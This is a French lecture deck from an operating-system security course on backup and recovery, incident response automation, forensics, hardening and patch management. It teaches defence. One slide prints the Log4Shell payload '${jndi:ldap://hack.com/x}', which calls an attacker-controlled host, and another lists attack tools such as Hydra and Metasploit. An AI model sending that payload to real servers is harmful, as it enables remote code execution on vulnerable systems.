

Sécurité des systèmes
d’exploitations
Chapitre 5 : Méthodes de récupération et de
reprise après défaillance
2eme année second cycle : Cybersecurity
Dr. Manel BABA AHMED
## 1

Plan chapitre 5 :Méthodes de récupération et de reprise
après défaillance
•Backup (sauvegarde) et stratégies de reprise : type (selon la méthode de sauvegarde, Selon le type de
données, Selon le type de stockage, Selon l’automatisation)
•Snapshot (instantané)
•Backup vs Snapshot
•Backup, Snapshot, RAID
•Autres stratégies de réccupération (recovery) : réplication, High Availability, PRA/PCA, Disaster
Recovery as a Service, RAID, comparaison
•Réponse aux incident : définition, fonctionnement, shuffle, n8n
•Forensic (analyse post incident) : Disk forensics, Memory forensics, Log forensics, Network forensics,
forensic automatique
•System hardening (renforcement de la sécurité du systeme (selon Intel)), résumé
•Patch management : mise a jour, package manager, quelques pratiques
## 2

Backup (sauvegarde)et stratégies de reprise
Un backup (sauvegarde)est une copie des données (fichiers, système, base de données...) stockée dans un
autre emplacement afin de pouvoir les restaurer en cas de perte.
•Exemple
Copier /home vers un disque externe
Sauvegarde sur cloud (Google Drive, serveur distant...)
Les stratégies de reprisesont l’ensemble des méthodes
utilisées pour restaurer un système et ses données après
un incident (panne, attaque, suppression...).
Explication simple
Backup = prévention (on prépare une copie)
Reprise = réaction (on restaure après problème)
## 3

Backup (sauvegarde) :types : selon la méthode de
sauvegarde
## 4
Type de BackupPrincipeAvantagesInconvénients
## Full Backup
(Sauvegarde
complète)
Copie toutes les données à chaque
fois
Restauration très
simple
Très fiable
Prend beaucoup de
temps
Consomme beaucoup
d’espace
## Incremental
## Backup
(Sauvegarde
incrémentale)
Sauvegarde uniquement les
modifications depuis la dernière
sauvegarde (full ou incrémentale)
Très rapide
Utilise peu d’espace
Restauration complexe
(chaîne de backups
nécessaire)
## Differential
## Backup
(Sauvegarde
différentielle)
Sauvegarde les modifications depuis
le dernier full backup
Plus simple que
l’incrémental
Restauration plus
rapide
Taille augmente avec le
temps

Backup (sauvegarde) :types : selon la méthode de
sauvegarde
Full backup
Jour 1 → tout sauvegardé
Jour 2 → tout sauvegardé encore
Incremental backup
## J1 → Full
J2 → modifs depuis J1
J3 → modifs depuis J2
restauration J3 = Full + J2 + J3
Differential backup
## J1 → Full
J2 → modifs depuis J1
J3 → modifs depuis J1
restauration J3 = Full + J3
## 5

Backup (sauvegarde) :types : selon le type de données
## 6
Type de BackupPrincipeDétails / Objectif
## File-level Backup
(Sauvegarde de fichiers)
Sauvegarde des fichiers
spécifiques (documents,
images...)
Protection ciblée des données
utilisateur
Image / Disk Backup (Image
système)
Copie tout le disque ou le système
d’exploitation
Restaurer un système complet
## Database Backup
(Sauvegarde base de
données)
Sauvegarde des bases de donnéesProtection des données

Backup (sauvegarde) :types : selon le stockage
## 7
Type de
## Backup
## Support /
## Localisation
## Détails
Backup localDisque dur externeSauvegarde stockée localement sur des supports physiques
Backup cloudGoogle DriveSauvegarde stockée à distance via Internet
## Air-gapped
backup
Support isolé (sans
réseau)
Sauvegarde déconnectée du réseau (stocké ailleurs)
Protection contre ransomware

Backup (sauvegarde) :types : selon l’automatisation
## 8
Type de BackupPrincipeDétails
Backup manuelFait à la mainDéclenché par l’utilisateur
Backup automatiqueExécuté automatiquementVia cron, scripts

## Snapshot(instantané)
Une capture de l’état du système à un instant précis comme une photo du système (fichiers, disque, VM...)
Le snapshot utilise le principe :Copy-On-Write (COW) :au début → il ne copie rien, il pointe vers les blocs
existants
Quand une donnée change :
–l’ancien bloc est sauvegardé dans le snapshot
–le nouveau bloc remplace l’original
•Limites du snapshot
–dépend du disque original
–si problème avec le disque → snapshot perdu
Remarque : Le snapshot est une technique de capture instantanée de l’état d’un système, permettant une
restauration rapide, mais ne remplace pas une sauvegarde complète en raison de sa dépendance au support
de stockage d’origine.
## 9

## Snapshot(instantané)
## Remarque :
–Le snapshot contient / pointe vers : A (inchangé), B (ancienne version), C (inchangé), D (ancienne
version supprimée)
–À ce moment : E1 et E2 n’existaient pas encore
## 10

Backup vs Snapshot
## 11
CritèreSnapshotBackup
Vitessetrès rapidelent
Stockagefaible au débutélevé
Protection panne
disque
nonoui
Restaurationtrès rapideplus lente

Backup, Snapshot,RAID
•Backup (Full / Incremental / Differential): assurer la protection et la récupération des données en
cas de perte, de corruption ou d’attaque
•Snapshot: technique de restauration rapide à court terme permettant de revenir à un état antérieur
du système, mais dépendant du même support de stockage
•RAID: assurer la disponibilité des données en cas de panne matérielle en répartissant ou répliquant les
données, (exemple RAID1, supprimer un fichier revient a le supprimer des disques miroires)
•Remarque il est recommandé de combiner ces trois mécanismes en utilisant le RAID pour assurer la
disponibilité (si disque tombe en panne un autre prendra le relai (sur meme serveur generalement), le
snapshot pour une restauration rapide en cas d’erreur ou d’attaque récente, et le backup (Full /
Incremental / Differential) pour garantir une protection complète et durable des données sur le long
terme
## 12

Autres stratégies de récupérations (recovery) :
## Replication
Copier les données en temps réel ou quasi temps réel vers un autre serveur, pour assuré la disponibilité
et la continuité
## Types :
–Synchrone → données écrites en même temps (0 perte)
–Asynchrone → léger délai (petite perte possible)
## Avantages :
–Très faible RPO (Recovery Point Object) (≈ 0)
–Continuité de service
## Inconvénients :
–Coût élevé
–Réplique aussi les erreurs (ex: ransomware)
## 13

Autres stratégies de récupérations (recovery) : High
Availability HA
•La haute disponibilité (HA) consiste à garantir que le service reste accessible même en cas de panne.
•Réduire le RTO (temps de reprise) à presque 0
Principe de fonctionnement
HA repose sur la redondance + surveillance
Composants clés :
•2 serveurs (minimum)
•Un mécanisme de surveillance (heartbeat)
•Un système de basculement (failover)
## Fonctionnement :
•Serveur principal fonctionne normalement
•Serveur secondaire surveille (heartbeat
## )
•Si panne détectée : basculement automatique (failover)
•Le service continue sur le secondaire
## 14

Autres stratégies de récupérations (recovery) : High
Availability HA (Haute Disponibilité)
## 15
Active/PassiveActive/Active
•Un serveur actif, l’autre en attente (surveille le
heartbeat)
## Avantages :
•Simple à mettre en place
•Stable
## Inconvénients :
•Ressources non utilisées (passif)
•Plusieurs serveurs actifs en même temps (les
deux serveurs traitent des requêtes, charge
répartie (load balancing))
## Avantages :
•Utilisation optimale des ressources
•Performances élevées
## Inconvénients :
•Synchronisation complexe
•Gestion des données difficile

Autres stratégies de récupérations (recovery) : High
Availability HA (Haute Disponibilité)
Concepts clé de HA :
–Heartbeat : signal entre serveurs pour vérifier qu’ils sont vivants
–Failover : basculement automatique vers un autre serveur
–Failback : retour au serveur principal après réparation
–Virtual IP (VIP) : une seule adresse IP utilisée par les clients, elle “se déplace” vers le serveur actif
## Outils Linux :
•Keepalived, HAProxy, Pacemaker, Corosync
Remarque :la réplication permet de dupliquer les données, tandis que la haute disponibilité garantit la
continuité du service en cas de panne, souvent en s’appuyant sur des mécanismes de réplication et de
basculement automatique.
## 16

Autres stratégies de récupérations (recovery) : PRA/PCA
## 17
PRA (Plan de Reprise d’Activité)PCA (Plan de Continuité d’Activité)
Objectif :remettre le système en fonctionnement après un
incident, après la panne
Objectif :continuer à fonctionner pendant
l’incident, pendant la panne
Principe :restaurerPrincipe :basculer / contourner
Isoler la machineServeur principal tombe
Analyser les logs (journalctl)HA détecte la panne
Nettoyer le systèmeBasculement (failover)
Restaurer les données :rsync -av /backup/ /data/
Serveur secondaire prend le relais
Vérifier intégritéUtilisateurs continuent
Remettre en service
Technologies utilisées :Technologies utilisées :
BackupHA (High Availability)
SnapshotRéplication
Scripts de restauration
Limite :temps de restaurationLimite :ne répare pas le problème

Autres stratégies de récupérations (recovery) : Disaster
Recovery as a Service (DRaaS)
•Externalisation du PRA (Plan de Reprise d’Activité) dans le cloud
•Au lieu de construire un site secondaire (très coûteux) on utilise : un cloud provider qui gère la reprise
## Fonctionnement :
Sauvegarde / réplication
–données copiées vers le cloud
–souvent en continu
## Virtualisation
–les serveurs sont convertis en VM
## Surveillance
–détection de panne
## Failover
–démarrage des VM dans le cloud
Accès utilisateurs
–redirection vers le cloud
## 18

Autres stratégies de récupérations (recovery) : Disaster
Recovery as a Service (DRaaS)
## Remarque :
Sans virtualisation du serveur :
serveur tombe → réinstaller Linux → reconfigurer → restaurer
Avec virtualisation du serveur :
serveur tombe → lancer VM → terminé
La virtualisation permet de transformer un serveur physique en machine virtuelle afin de pouvoir le
déplacer, le copier et le redémarrer facilement sur une autre machine.
## 19

Autres stratégies de récupérations (recovery) : RAID
•RAID = technique qui combine plusieurs disques
## Objectif :
–améliorer performance
–assurer disponibilité
–tolérer pannes disque
RAID protège contre : panne disque
MAIS pas contre :
## –ransomware
–suppression fichier
–erreur humaine
## Limites :
Sur même serveur, si panne électrique les disque sont indisponibles, l’erreur est copié sur tout les disques, si on
supprime le fichier est supprimé dans tout les disques
## 20

Autres stratégies de récupérations (recovery) :
comparaison
## 21
SolutionObjectif principal
## Moment
d’action
Protège contreLimites
## Backup
Sauvegarder les
données
## Après
incident
suppression, ransomware,
corruption
restauration lente
## Snapshot
Retour rapide
## (rollback)
## Après
incident
erreur récente, mauvaise
manipulation
dépend du même
stockage
## Réplication
Copier les données en
continu
Avant et
pendant
incident
panne serveur
copie aussi les
erreurs, le service
ne bascule pas
## High
## Availability
Assurer continuité
service
## Pendant
incident
panne système/serveur,
assure que le service
continue
ne protège pas les
données
DRaaS
PRA automatisé dans
le cloud
## Pendant +
après
panne majeure, sinistre
(reprise après incident)
dépend du cloud
## RAID
Tolérance panne
disque
## Pendant
incident
panne matérielle
pas protection
logique

Réponse aux incident(Incident Response IR) :
définition
Ensemble de procédures organisées permettant de détecter, analyser, contenir, éliminer et corriger un
incident de sécurité informatique.
## Objectifs
–limiter les dégâts
–arrêter l’attaque
–restaurer le système
–éviter que ça se reproduise
## 22

Réponse aux incident(Incident Response IR) :
fonctionnement
Préparation (Preparation) :se préparer avant les attaques et mettre en place :
–outils (logs, IDS, SIEM, Wazuh...)
–politiques de sécurité
## –procédures
Détection & Analyse :identifier l’incident et analyser :
–logs système
## –alertes
•Exemple :
journalctl -u ssh
grep "Failed password" /var/log/auth.log
## 23

Réponse aux incident(Incident Response IR) :
fonctionnement
Containment (Confinement): bloquer l’attaque immédiatement
–isoler machine
–bloquer IP
–couper accès
–Exemple :iptables -A INPUT -s 192.168.1.100 -j DROP
Eradication (Éradication): supprimer la cause
–supprimer malware
–corriger vulnérabilité
–patch système (une mise a jour qui corrige des failles dans un système): apt update && apt
upgrade -y
## 24

Réponse aux incident(Incident Response IR) : Shuffle
•Shuffle= plateforme SOAR (Security Orchestration, Automation & Response)
–Automatise la réponse aux incidents
–Connecte plusieurs outils (SIEM, IDS, firewall...)
–Utilise des playbooks visuels (un workflow qui est une suite
d’étapes automatisé de réponse à incident
•Un playbook contient :
•Trigger(déclencheur) ex : alerte Wazuh, webhook
•Actions(apps) :ex : firewall, SSH
•Conditions(logique) if / else
•Flow (enchaînement) : ordre des étapes
## 25

Réponse aux incident(Incident Response IR) : Shuffle
sudo apt update
sudo apt install docker.io docker-compose -y
sudo systemctl start docker
sudo systemctl enable docker
git clone https://github.com/Shuffle/Shuffle.git
cd Shuffle
docker-compose up -d
http://localhost:3001
## 26

Réponse aux incident(Incident Response IR) : Shuffle
## •
## 27
Étape 1 :Créer un Workflow
Dans Shuffle :“Create Workflow”
Étape 2 :Ajouter un Trigger
## Node : Webhook
Shuffle reçoit des événements externes
Étape 3: Simuler une attaque
curl -X POST
http://localhost:5678/webhook/test \
## -d
## '{"ip":"192.168.1.100","event":"brut
eforce"}' \
-H "Content-Type: application/json"
Étape 4 :Ajouter une condition
## Node : Condition
event == bruteforce
Étape 5 :Ajouter des actions
Action 1 :Bloquer IP
## Node : Run Command
iptables -A INPUT -s
192.168.1.100 -j DROP
Action 2: Envoyer une alerte
## Node : Email
Brute force détecté depuis
## 192.168.1.100
Action 3 :Désactiver utilisateur
usermod -L user1

Réponse aux incident(Incident Response IR) : n8n
•n8n est un logiciel open source d’automatisation de flux de travail (workflow automation) qui permet
de connecter diverses applications et services sans code complexe, orchestration simple et réponse
aux incidents
•n8n n’est pas un SOAR pur comme Shuffle mais il peut jouer le rôle de SOAR léger (limité par rapport a
## Shuffle)
•Wazuh → détecte
•n8n → réagit automatiquement
installation :
sudo apt update
sudo apt install nodejs npm -y
sudo npm install -g n8n
n8n start
http://localhost:5678
## 28

Réponse aux incident(Incident Response IR) : n8n
## (architecture)
Interface utilisateur (Frontend), permet de :
–créer workflow
–ajouter nodes
## –configurer
Remarque : chaque node a des Input (données entrantes), un traitement et un output (résultat)
Backend (moteur n8n) : le cœur
–exécuter les workflows
–gérer les nodes
–traiter les données
–Basé sur Node.js
## 29

Réponse aux incident(Incident Response IR) : n8n
## (architecture)
Base de données :stocke :
## –workflows
## –credentials
–historique d’exécution
Exemples : SQLite , PostgreSQL
Système d’exécution (Execution Engine):quand un workflow démarre :
–n8n lit le workflow
–exécute les nodes un par un
–transmet les données entre nodes
## 30

Réponse aux incident(Incident Response IR) : n8n et
## Wazuh
Scénario : attaque SSH détectée
Étape 1 :Wazuh détecte
Exemple log :
## {  "rule.id": "5710",
"event": "failed login",
## "srcip": "192.168.1.100"}
Étape 2 :envoi vers n8n via : Webhook, API le log
Étape 3: Node.js traite dans n8n
## –n8n (backend Node.js) :
–reçoit le JSON
## –analyse
–décide (IF node)
## 31

Réponse aux incident(Incident Response IR) : n8n et
## Wazuh
Étape 4 :action automatique
•Node.js peut lancer :iptables -A INPUT -s 192.168.1.100 -j DROP
## Résultat
–Wazuh détecte
–n8n décide
–Firewall bloque
Nodejs permet de :
•Exécuter des commandes système iptables, ou systemctl
•Communiquer avec des API : Wazuh API, SIEM, outils cloud
•Manipuler des données JSON : logs de sécurité
## 32

Réponse aux incident(Incident Response IR) : n8n
## (exemple)
Étape 1: Créer un Workflow
•Dashboard n8n -> New Workflow
Étape 2: Ajouter un Trigger (Webhook)
•Node : Webhook
•Configurer :
•Method : POST
•Path : attack
•URL générée :http://localhost:5678/webhook/attack
Étape 3 :Simuler une attaque (Linux)
curl -X POST http://localhost:5678/webhook/attack \
-H "Content-Type: application/json" \
## -d '{"ip":"192.168.1.100","event":"failed_login"}'
simuler :
•brute force SSH
•tentative d’intrusion
## 33

Réponse aux incident(Incident Response IR) : n8n
Étape 4 :Ajouter une condition
•Node : IF
•Condition :
## •{{$json["event"]}} == "failed_login"
Étape 5: Ajouter des actions
Action 1: Bloquer IP (niveau OS)
•Node :Execute Command iptables -A INPUT -s {{$json["ip"]}} -j DROP
Action 2 :Alerte sécurité
•Node : Email
•Attaque détectée depuis {{$json["ip"]}}
Action 3 :Log système
•echo "Attack from {{$json["ip"]}}" >> /var/log/security.log
## 34

Forensics(analyse post incident)
•La computer forensics (informatique légale) = analyse des traces laissées après une attaque
## Objectifs :
–comprendre ce qui s’est passé
–identifier l’attaquant
–déterminer l’impact
–collecter des preuves
## 35
TypeDescription
Disk Forensicsanalyse disque
Memory Forensicsanalyse RAM
Log Forensicsanalyse journaux
Network Forensicstrafic réseau

Forensics(analyse post incident) : Disk Forensics
•Le Disk Forensics = analyse des données stockées sur un disque (ou image disque)
## Objectifs :
–retrouver des fichiers supprimés
–détecter des traces d’attaque
–analyser l’activité utilisateur
–reconstruire une chronologie
Sur un disque Linux :
## –fichiers (/home, /tmp, /var)
## –logs (/var/log)
## –comptes (/etc/passwd)
## –historique (.bash_history)
–programmes suspects
## 36

Forensics(analyse post incident) : Memory Forensics
•Memory Forensics = analyse du contenu de la mémoire vive (RAM)
## Objectifs :
–détecter processus cachés (rootkits)
–récupérer les commandes exécutées
–voir programmes en cours d’exécution
–analyser une attaque en temps réel
Ce qu’on trouve dans la RAM
–processus actifs
–connexions réseau
–mots de passe en clair (parfois)
–malware en mémoire
–clés de chiffrement
## 37

Forensics(analyse post incident) : Log Forensics
•Log Forensics = analyse des journaux système pour détecter et comprendre une attaque
## Objectifs :
–détecter des activités suspectes
–identifier attaquant (IP, user)
–reconstruire l’attaque
–prouver un incident
## 38
LogRôle
## /var/log/auth.log
authentification (SSH, sudo)
## /var/log/sys.log
système
## /var/log/kern.log
noyau
## /var/log/apache2/access.log
web
## /var/log/apache2/error.log
erreurs web

Forensics(analyse post incident) : Network Forensics
•Network Forensics = analyse du trafic réseau pour détecter et comprendre une attaque
## Objectifs :
–identifier communications suspectes
–détecter exfiltration de données (upload vers l’extérieur)
–analyser attaques (scan, brute force, malware)
–reconstruire échanges réseau
Ce qu’on analyse, le trafic réseau contient :
–IP source / destination
## –ports
–protocoles (HTTP, DNS, SSH...)
## –paquets (payload)
Outils principaux
–Wireshark
## –tcpdump
## 39

Forensics(analyse post incident) : forensic automatique
Autopsy (Digital Forensics Tool)
–Logiciel open source d’investigation numérique
–Interface graphique basée sur The Sleuth Kit (un ensemble de fonctions / modules que les
développeurs peuvent utiliser dans leurs programmes)
–Utilisé pour analyser disques, images et supports numériques
–Plateformes : Windows • macOS • Linux
Fonctionnalités principales :
–Analyse de disques / images pour preuves numériques
–Récupération de fichiers supprimés
–Recherche par mots-clés, exemple :grep "Failed password" /var/log/auth.log
–Analyser l’activité utilisateur (historique web)(how to hack ssh)
## 40

Forensics(analyse post incident) : forensic automatique
## Autopsy : Ubuntu
–sudo apt install autopsy –y
## –autopsy
–Sur navigateur :http://localhost:9999/autopsy
–Sur interface : create New Case
–Ajouter une preuve soit un dossier ou une image disque :sudo dd if=/dev/sdb of=disque.img bs=4M
status=progress
## 41
Modules à activer :
File Type Identification → identification des types de
fichiers
Keyword Search → recherche de mots-clés (ex :
password,secret)
Recent Activity → activités récentes (navigateur,
## USB...)
Extract Deleted Files → récupération fichiers
supprimés
Hash Lookup → détection de malware (empreintes
connues)
Interface d’analyse :
File View→ voir tous les fichiers
Deleted Files→ fichiers supprimés récupérés
Web Artifacts→ historique de navigation
Keyword Search→ recherche ciblée de mots

Forensics(analyse post incident) : forensic automatique
Plaso (Log2timeline)
•Moteur forensique écrit en Python
•Génère des super timelines (chronologie globale) , (une super timeline est une chronologie complète,
qui regroupe tous les événements d’un système (logs, fichiers, web, etc.)
•Corrèle événements (relier les évenement) issus de multiples logs
•Plateformes : Linux • Windows • macOS
•Permet de lire automatiquement différents types de données (artefacts) (logs, fichiers, registre...) grâce
à des modules spécialisés (parseurs + plugins) pour en extraire des informations utiles.
•Il lit et comprend automatiquement les traces du système grâce à des outils internes spécialisés
•L’outillog2timeline.pycollecte les événements et les stocke dans un fichier de sortie (souvent un
stockage Plaso.plaso), puispsort.pypermet de filtrer, transformer et exporter ces événements
(CSV, JSON, etc.) pour exploitation dans d’autres outils ou feuilles de calcul.
## 42

Forensics(analyse post incident) : forensic automatique
Plaso (Log2timeline)
–sudo apt install plaso-tools -y
–Generation de la timeline :log2timeline.py timeline.plaso /chemin/vers/donnees
Explication : collecter et analyser les evenements, fichier de sortie timeline.plaso contient toute les
informations extraites
–Analyse/export :psort.py -o l2tcsv timeline.plaso > timeline.csv
Explication : filtrer la timeline avec psort.py et l’envoyer dans un fichier lisible .csv
–Ouvrir CSV avec Excel / LibreOffice (Linux)
## Rechercher :
connexions suspectes
accès fichiers
activité utilisateur
## 43

Forensics(analyse post incident) : forensic automatique
GRR Rapid Response
–Framework open source de réponse aux incidents & forensic à distance
–Développé par Google
–Permet d’investiguer sans accès physique aux machines
–Plateformes : Windows • macOS • Linux
## Fonctionnement
–Architecture client–serveur
–Agents installés sur les machines (endpoints)
–Communication sécurisée avec serveur central
–Exécution de flows (scripts de collecte) : fichiers, logs, mémoire, registre (base de données interne a
windows exemple qui contient les configurations systèmes)
–Largement utilisé par les équipes SOC analyst
Remarque :GRR = forensic + incident response à distance
## 44

Forensics(analyse post incident) : forensic automatique
GRR Rapid Response
–GRR fonctionne en 2 parties :
–Serveur
–Agent (installé sur machine cible)
–Serveur sur docker :docker run -d -p 8000:8000 --name grr grrdocker/grr
–Acces :http://localhost:8000
–Agent sur machine cible :sudo dpkg -i grr-client*.deb  (installation de l’agent sur
machine cible)
sudo systemctl start grr-client
–Sur interface web :Voir les machines
–Objectif : détecter activité suspecte
–Lister processusFlow : ListProcesses
–Chercher fichier sensibleFlow : File Finder, Exemple : /etc/passwd
–Executer commande :ps aux
netstat -tulnp
## 45

System hardening :renforcement de la sécurité du
système(selon Intel)
## Objectifs :
–Identifier et corriger les vulnérabilités
–Sécuriser OS, applications et réseaux
–Renforcer mots de passe et configurations
–Réduire les risques d’attaque
Benefices du hardening (renforcement):
–Réduction du risque de cyberattaque
–Moins de downtime et pertes financières
–Amélioration de la productivité
–Facilitation de la conformité (normes, audits)
Périmètre du hardening (renforcement):
–Serveurs et data centers
–Postes utilisateurs (très critiques)
–Applications et systèmes d’exploitation
–Matériel et firmware
## 46
## Remarque :
–90% des attaques passent par les postes
utilisateurs
–Les attaques ciblent désormais sous l’OS
(firmware, hardware)
–Sécuriser uniquement les serveurs ne suffit plus

System hardening :renforcement de la sécurité du
système(selon Intel)
Les pratiques courantes de renforcement des systèmes incluent :
–Renforcement du système d’exploitation :sécuriser le système d’exploitation de base en supprimant les
services inutiles, en appliquant les correctifs (patchs) et en configurant les paramètres de sécurité.
–Renforcement des serveurs :protéger les serveurs physiques et virtuels grâce à des contrôles d’accès
spécialisés.
–Renforcement du réseau: renforcer l’infrastructure réseau à l’aide de règles de pare-feu, de la
segmentation et de protocoles sécurisés.
–Renforcement des applications :protéger les applications logicielles en définissant des paramètres de
sécurité.
–Renforcement des bases de données :sécuriser les systèmes de bases de données en limitant les
privilèges d’accès, en chiffrant les données sensibles et en sécurisant les configurations.
## 47

System hardening :renforcement de la sécurité du
système(selon Intel)
Objectifs du PC (Personal Computer) Hardening :
–Visibilité de la chaîne d’approvisionnement (savoir d’ou vient chaque composant du PC, de la
fabrication a l’installation) le systeme peut etre compromis avant même d’être utilisé
–Protection au démarrage via Secure Boot
–Protection du BIOS/UEFI contre les malwares
–Protection contre les attaques sur la mémoire physique
–Utilisation de la virtualisation matérielle afin d’isoler et réduire la surface d’attaque et de mécanismes
avancés de détection des menaces pour renforcer la sécurité des PC.
–Gestion à distance des postes (application des correctifs et maintenance système)
Problème : nouvelles vulnérabilités apparaissent constamment
## 48

System hardening :renforcement de la sécurité du
système(selon Intel)
Pratiques recommandé :
–Identifier tous les PC, serveurs et réseaux
–Documenter le matériel et les logiciels (OS, bases de données)(garder une liste de ce qui est installé)
–Vérifier les permissions
–Supprimer les comptes et privilèges inutiles
–Mettre à jour vers les versions récentes
–Remplacer les systèmes obsolètes (vulnérable)
–Appliquer lesupdatessans impacter les utilisateurs
–Réduire les interruptions (assurer la continuité du service pendant la maintenance)
–Utiliser des mots de passe forts
–Détecter lephishing
–Réduire les attaques par ingénierie sociale (formation des utilisateurs)
## 49

System hardening :résumé
## 50
Analyse et Reconnaissance
Objectif :Identifier les vulnérabilités du système.
## Outils :
–Nmap : Scan des ports et services
–Lynis : Audit de sécurité système
–OpenVAS : Analyse des vulnérabilités
Simulation d’attaque
Objectif :Tester les failles exploitables.
## Outils :
–Hydra : Attaque brute force
–Metasploit : Exploitation des vulnérabilités
–Searchsploit : Recherche d’exploits
Application du Hardening
Objectif :Sécuriser le système.
## Outils :
–iptables : Filtrage réseau
–UFW : Firewall simplifié
–SSH : Configuration sécurisée des accès
Gestion des accès
Objectif :Contrôler les privilèges utilisateurs.
## Outils :
–PAM : Gestion de l’authentification
–chmod / chown / sudo : Gestion des
permissions
–Fail2Ban : Protection contre brute force

System hardening :résumé
## 51
## Patch Management
Objectif :Corriger les vulnérabilités connues.
## Outils :
–apt / yum / pacman : Gestion des paquets
–unattended-upgrades : Mises à jour
automatiques sans intervention user
Monitoring et Détection
Objectif :Surveiller les activités du système.
## Outils :
–Wazuh : SIEM / HIDS
–journalctl : Analyse des logs
–auditd : Audit système
Réaction automatique
Objectif :Bloquer les attaques en temps réel.
## Outils :
–Fail2Ban : Blocage automatique des IP
–n8n : Automatisation des actions
–Shuffle : Orchestration SOAR
## Validation
Objectif :Vérifier l’efficacité du renforcement
## Outils :
–Nmap : Re-scan du système
–Lynis : Re-audit sécurité

Patch Management :mise a jour
Mise a jour : remplaces des morceaux de logiciel vulnérables par des versions corrigées
apt update: cette commande ne met rien à jour , elle met à jour la liste des packages disponibles
En interne :
–Contacte les dépôts (repositories)
–Télécharge des fichiers index :/var/lib/apt/lists/
## Contient :
–versions des logiciels
## –dépendances
–informations sécurité
## Résultat :
–Le système sait qu’une nouvelle version existe
–Mais rien n’est installé encore
## 52

Patch Management :mise a jour
apt upgrade
- Résolution des dépendances, apt vérifie :
–quelles versions sont installées
–quelles versions sont disponibles
–quelles dépendances sont nécessaires
- Téléchargement des packages fichiers téléchargés dans :/var/cache/apt/archives/
- Remplacement des fichiers : les fichiers système sont remplacés :
## –/usr/bin/ →programmes
## –/lib/ →bibliothèques
–/etc/ →fichiers config (parfois conservés)
## 53

Patch Management :mise a jour
- Scripts de post-installation : chaque package exécute des scripts :
–redémarrer un service
–migrer une config
–nettoyer ancien fichier
- Mise à jour des services :
–Apache → redémarré
–SSH → rechargé
## Exemple :
•version vulnérable :
strcpy(buffer, input);
•version patchée :
strncpy(buffer, input, sizeof(buffer));
apt upgraderemplace le code vulnérable par la version corrigée
## 54

Patch Management: package manager
•APT : gestionnaire de paquets pour Debian/Ubuntu (installation et mise à jour logiciels)
sudo apt install nginx
•Pacman : gestionnaire de paquets pour Arch Linux (mise à jour rapide et complète du système)
sudo pacman -Syu
•npm : gestionnaire de paquets JavaScript (applications web et dépendances Node.js)
npm install express
•pip : gestionnaire de paquets Python (bibliothèques et outils Python)
pip install requests
•DNF / yum : gestionnaires de paquets pour les distribution linux RedHat/CentOS (paquets .rpm)
sudo dnf install httpd
•snap : installation d’applications isolées (sandbox)
sudo snap install vlc
•flatpak : applications sécurisées en environnement isolé
flatpak install flathub(dépot)org.videolan.VLC(lecteur video)
## 55

Patch Management: quelques pratiques
Cycle du Patch Management
–Identification des vulnérabilités
–Recherche des correctifs disponibles
–Test des patchs (en environnement de test)
–Déploiement des mises à jour
–Vérification et validation
–Surveillance continue
Risques du Patch Management
–Un patch peut casser une application
–Problèmes de compatibilité système
–Interruption de service (downtime) (certain services nécessite un redémarrage) ou cause arrêt
–Mauvaise configuration après mise à jour (le patch peut créer une mauvaise configuration)
–Patch mal testé = nouveau bug
## 56

Patch Management: quelques pratiques
Importance des tests
–Tester avant déploiement en production
–Utiliser un environnement de test (VM)
## Vérifier :
–fonctionnement des services
–compatibilité des applications
–Réduire les risques d’erreur
Ne jamais patcher directement en production”
Automatisation du Patch Management
–Mise à jour automatique des systèmes
–Réduction des erreurs humaines
–Gain de temps pour les administrateurs
–Réaction rapide aux nouvelles vulnérabilités
–Exemple Linux :unattended-upgrades
## 57

Patch Management: Log4Shell
Exemple réel de vulnérabilité (CVE)
•Log4Shell
–Vulnérabilité critique dans Apache Log4j (Java), Log4j enregistre des messages
–Permet exécution de code à distance (RCE), donc l’idée est juste de créer un texte pour déclenché une attaque
–Exploitation massive dans le monde entier
–Un attaquant envoi a un serveur :${jndi:ldap://hack.com/x}
–L’attaquant dit interprète et exécute ce contenu {....}
ojndi: Java Naming and Directory Interface, pour récupérer le code, et utilise ldap pour aller le récupérer
oldap: protocole réseau, utilisé pour récupérer des données depuis un serveur
ohack.com/x: serveur contrôlé par l’attaquant, contient du code malveillant
–Le serveur : il fait automatiquement :
## –contactehack.com
–récupère du code
–exécute ce code
## 58

Patch Management: résumé
Il faut alors :
–Correction via mise à jour (patch)
–Sans patch → système compromis
–Avec patch → vulnérabilité corrigée
Activer les mises à jour automatiques du système et installer les patchs de sécurité sans
intervention humaine
–Installer l’outil de mise à jour automatique des patchs :sudo apt install unattended-
upgrades
–Active et configure les mises à jour automatiques :sudo dpkg-reconfigure unattended-
upgrades
## 59